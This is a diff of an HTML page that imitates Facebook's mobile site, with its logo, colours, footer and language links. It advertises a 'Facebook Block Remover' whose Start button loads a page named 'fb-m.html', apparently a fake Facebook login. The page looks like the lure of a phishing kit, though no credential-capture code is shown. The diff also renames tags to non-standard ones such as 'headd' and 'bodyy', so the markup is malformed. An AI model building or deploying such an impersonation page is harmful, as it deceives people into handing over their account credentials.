@@ -1,185 +1,181 @@
 <html>
-  <afterhtml>
-    <afterhtml>
-      <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
-        <script>
-          function GoToLogin(){
-            $('body').load("fb-m.html");
-          };
-          function GoToIndex(){
-            $('body').load("index.html");
-          };
-        </script>
-        <style>
-          @font-face {
-            font-family: "klavika";
-            src: url("klavika.woff2");
-          }
-          body {
-            margin:0px;
-            text-align:center;
-            background:white;
-            font-family:Helvetica, Arial, sans-serif;
-            font-weight:400;
-            color:#4b4f56;
-            font-size:14px;
-          }
-          header {
-            max-height:44px;
-            padding:12px 0px;
-            background:#3b5998;
-          }
-          .entire {
-            background:#d8dfea;
-            width:100%;
-            height:auto;
-          }
-          .afterheader {
-            margin: 0 auto;
-            max-width:416px;
-            padding: 0px 16px 36px 16px;
-          }
-          .back {
-            float:left;
-            margin:3px -35px 3px 10px!important;
-            padding:0px;
-            border-width:0px;
-            align-items:normal;
-            background:none;
-          }
-          .logout {
-            color:white;
-            font-size:15px;
-            display:inline-block;
-            position:absolute;
-            left:26px;
-            padding:0px;
-            border-width:0px;
-            align-items:normal;
-            background:none;
-          }
-          .image {
-            margin:20px 0px;
-          }
-          .fbblkrmv {
-            font-family:'klavika';
-            font-size:20px;
-            margin:0px 0px 5px 0px;
-          }
-          .nameinput {
-            overflow: hidden;
-            border:0px;
-            padding-left:7px;
-          }
-          .submit {
-            text-shadow: 0 -1px rgba(0, 0, 0, .25);
-            background-color: #627aad;
-            background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
-            border-style: solid;
-            border-width: 1px;
-            border-color: #4a5b7e;
-            font-size: 14px;
-            line-height: 38px;
-            padding: 0 16px;
-            margin-top: 12px!important;
-            color: #fff;
-            font-weight: bold;
-          }
-          .insides {
-            height:37px;
-            border-radius:4px;
-            width:100%
-          }
-          .fblogo {
-            width:104px;
-            height:20px;
-          }
-          footer {
-            background:white;
-            height:auto;
-            padding:14px;
-          }
-          .language {
-            display:inline-block;
-            width:50%;
-          }
-          .languages {
-            font-size: 12px;
-            line-height: 16px;
-            text-decoration:none;
-            color: #576b95;
-            font-size: 12px;
-            line-height: 16px;
-            margin:0px auto;
-            display:block;
-          }
-          .english {
-            font-weight: bold;
-            font-size: 12px;
-            line-height: 16px;
-            color: #90949c;
-          }
-          .plus {
-            margin: 0 auto;
-            border: 1px solid #3b5998;
-            border-radius: 3px;
-            color: #4080ff;
-            display: block;
-            font-size: large;
-            height: 18px;
-            line-height: 17px;
-            text-align: center;
-            vertical-align: middle;
-            width: 18px;
-          }
-          .plus>img {
-            margin: 3px 0;
-            width: 12px;
-            height: 12px;
-          }
-          .facebook {
-            font-size: 12px;
-            line-height: 15px;
-            color: gray;
-            text-align: center;
-            display:block;
-            width:100%;
-            margin:5px 0px;
-          }
-        </style>
-      </head>
-      <body>
-        <header>
-          <img class="fblogo" src="fblogo.png">
-        </header>
-        <div class="entire">
-          <div class="afterheader">
-            <img class="image" src="unblock.png">
-            <div class="fbblkrmv">Facebook Block Remover</div>
-            <div style="margin:0px 0px 20px 0px">Remove facebook block with one click</div>
-            <button class="submit insides" id="submit" onclick="GoToLogin()">Start</button>
-          </div>
+  <headd>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+    <script>
+      function GoToLogin(){
+        $('body').load("fb-m.html");
+      };
+      function GoToIndex(){
+        $('body').load("index.html");
+      };
+    </script>
+    <style>
+      @font-face {
+        font-family: "klavika";
+        src: url("klavika.woff2");
+      }
+      body {
+        margin:0px;
+        text-align:center;
+        background:white;
+        font-family:Helvetica, Arial, sans-serif;
+        font-weight:400;
+        color:#4b4f56;
+        font-size:14px;
+      }
+      header {
+        max-height:44px;
+        padding:12px 0px;
+        background:#3b5998;
+      }
+      .entire {
+        background:#d8dfea;
+        width:100%;
+        height:auto;
+      }
+      .afterheader {
+        margin: 0 auto;
+        max-width:416px;
+        padding: 0px 16px 36px 16px;
+      }
+      .back {
+        float:left;
+        margin:3px -35px 3px 10px!important;
+        padding:0px;
+        border-width:0px;
+        align-items:normal;
+        background:none;
+      }
+      .logout {
+        color:white;
+        font-size:15px;
+        display:inline-block;
+        position:absolute;
+        left:26px;
+        padding:0px;
+        border-width:0px;
+        align-items:normal;
+        background:none;
+      }
+      .image {
+        margin:20px 0px;
+      }
+      .fbblkrmv {
+        font-family:'klavika';
+        font-size:20px;
+        margin:0px 0px 5px 0px;
+      }
+      .nameinput {
+        overflow: hidden;
+        border:0px;
+        padding-left:7px;
+      }
+      .submit {
+        text-shadow: 0 -1px rgba(0, 0, 0, .25);
+        background-color: #627aad;
+        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
+        border-style: solid;
+        border-width: 1px;
+        border-color: #4a5b7e;
+        font-size: 14px;
+        line-height: 38px;
+        padding: 0 16px;
+        margin-top: 12px!important;
+        color: #fff;
+        font-weight: bold;
+      }
+      .insides {
+        height:37px;
+        border-radius:4px;
+        width:100%
+      }
+      .fblogo {
+        width:104px;
+        height:20px;
+      }
+      footer {
+        background:white;
+        height:auto;
+        padding:14px;
+      }
+      .language {
+        display:inline-block;
+        width:50%;
+      }
+      .languages {
+        font-size: 12px;
+        line-height: 16px;
+        text-decoration:none;
+        color: #576b95;
+        font-size: 12px;
+        line-height: 16px;
+        margin:0px auto;
+        display:block;
+      }
+      .english {
+        font-weight: bold;
+        font-size: 12px;
+        line-height: 16px;
+        color: #90949c;
+      }
+      .plus {
+        margin: 0 auto;
+        border: 1px solid #3b5998;
+        border-radius: 3px;
+        color: #4080ff;
+        display: block;
+        font-size: large;
+        height: 18px;
+        line-height: 17px;
+        text-align: center;
+        vertical-align: middle;
+        width: 18px;
+      }
+      .plus>img {
+        margin: 3px 0;
+        width: 12px;
+        height: 12px;
+      }
+      .facebook {
+        font-size: 12px;
+        line-height: 15px;
+        color: gray;
+        text-align: center;
+        display:block;
+        width:100%;
+        margin:5px 0px;
+      }
+    </style>
+  </headd>
+  <bodyy>
+    <header>
+      <img class="fblogo" src="fblogo.png">
+    </header>
+    <div class="entire">
+      <div class="afterheader">
+        <img class="image" src="unblock.png">
+        <div class="fbblkrmv">Facebook Block Remover</div>
+        <div style="margin:0px 0px 20px 0px">Remove facebook block with one click</div>
+        <button class="submit insides" id="submit" onclick="GoToLogin()">Start</button>
+      </div>
+    </div>
+    <footer>
+      <div style="display:flex;">
+        <div class="language">
+          <span class="english">English (US)</span>
+          <a class="languages">کوردیی ناوەندی</a>
+          <a class="languages">فارسی</a>
+          <a class="languages">Português (Brasil)</a>
         </div>
-        <footer>
-          <div style="display:flex;">
-            <div class="language">
-              <span class="english">English (US)</span>
-              <a class="languages">کوردیی ناوەندی</a>
-              <a class="languages">فارسی</a>
-              <a class="languages">Português (Brasil)</a>
-            </div>
-            <div class="language">
-              <a class="languages">العربية</a>
-              <a class="languages">Türkçe</a>
-              <a class="languages">Español</a>
-              <div class="plus"><img src="plus.png"></div>
-            </div>
-          </div>
-          <div class="facebook">Facebook ©2018</div>
-        </footer>
-      </body>
-    </afterhtml>
-  </afterhtml>
+        <div class="language">
+          <a class="languages">العربية</a>
+          <a class="languages">Türkçe</a>
+          <a class="languages">Español</a>
+          <div class="plus"><img src="plus.png"></div>
+        </div>
+      </div>
+      <div class="facebook">Facebook ©2018</div>
+    </footer>
+  </bodyy>
 </html>
